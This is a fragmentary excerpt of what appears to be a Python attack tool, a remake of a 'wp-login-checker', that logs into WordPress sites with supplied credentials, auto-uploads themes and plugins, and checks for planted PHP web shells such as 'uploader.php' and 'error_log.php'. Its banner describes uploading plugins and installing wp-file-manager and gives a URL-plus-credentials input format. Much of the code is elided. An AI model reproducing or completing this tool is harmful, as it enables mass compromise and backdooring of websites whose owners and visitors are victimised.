"""
Remake version of https://github.com/muzan519/wp-login-checker
Add Features :
+ Auto Upload Themes
+ Auto Upload Plugin
        ...
        if nonce:
            ...
            try:
                ...
                if upThemes.status_code == 200:
                    ...
                    url_shell = ['/wp-content/themes/{}/muzan519.php', '/wp-content/themes/{}/uploader.php']
                    found = False
                    for i in url_shell:
        ...
        if nonce:
            ...
            try:
                ...
                if upPlugin.status_code == 200:
                    ...
                    url_shell = ['/wp-content/plugins/{}/error_log.php', '/wp-content/plugins/{}/uploader.php']
                    found = False
                    for i in url_shell:
                        i = i.format(self.random_name)
                        try:
   ...
   \ \/  \/ / |  ___/______/ /\ \| |  | |  | | | |  | |
    \  /\  /  | |         / ____ \ |__| |  | | | |__| |
     \/  \/   |_|        /_/    \_\____/   |_|  \____/  Version : {yellow}{VERSION}{reset}
            ...
            {red}[{reset} https://github.com/{Fore.BLUE}muzan519{reset} {red}]{reset}

--> [{green}Desc{reset}] This tools use for upload plugins,themes,install wp-file-manager
--> [{yellow}Warn{reset}] Use format : https://bapaklukontol.co/wp-login.php#admin@fuckisrael
"""
    print(banner)
    if get_config():
